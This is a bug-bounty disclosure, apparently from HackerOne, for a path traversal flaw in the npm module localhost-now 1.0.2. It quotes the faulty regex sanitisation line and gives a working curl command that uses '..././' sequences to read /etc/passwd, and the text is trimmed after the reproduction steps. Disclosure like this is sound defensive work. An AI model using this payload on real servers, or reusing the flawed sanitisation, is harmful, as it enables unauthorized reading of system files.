# [H] [localhost-now] bypassing url filter which leads to read content of arbitrary file

## Summary
Severity: High (CVSS 7.5)
Program: Node.js third-party modules
Weakness: Path Traversal
Reporter: dienpv
State: resolved
Disclosed: 2018-05-30T13:05:21.202Z
CVE: CVE-2019-5416
Source: https://hackerone.com/reports/334837

## Details
Hi guys,
i can bypass url filter in localhost-now module.
It allows to read content of arbitrary files on the remote server.

# Module

**module name:** localhost-now
**version:** 1.0.2
**npm page:** https://www.npmjs.com/package/localhost-now

## Module Stats

26 downloads in the last week

## Vulnerability Description

Lack of file path sanitization by using the regex method causes that any file on the server might be read by malicious user
ex: input: url = ..././etc/passwd
when the url calls replace(/(\.\.[\/\\])+/g, '') and then ../ will be removed -> final result: url = ../etc/passwd. (same in windows for ```...\.\```)
```javascript
// /localhost-now/lib/app.js, line 17:
const file = url === '/' ? '/index.html' : url.replace(/(\.\.[\/\\])+/g, '')
```
## Steps To Reproduce:
- install ```localhost-now```:
```npm install localhost-now```
- run ```localhost-now``` in your directory

```
root@kali:/var/www/html/localhost-now/bin# nodejs localhost
Web Server started on localhost:1337
```
- execute following curl command (adjust number of ../ to reflect your system):

``` curl -v --path-as-is http://127.0.0.1:1337/..././..././..././..././..././etc/passwd ```
- look at result:

```
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/334837_
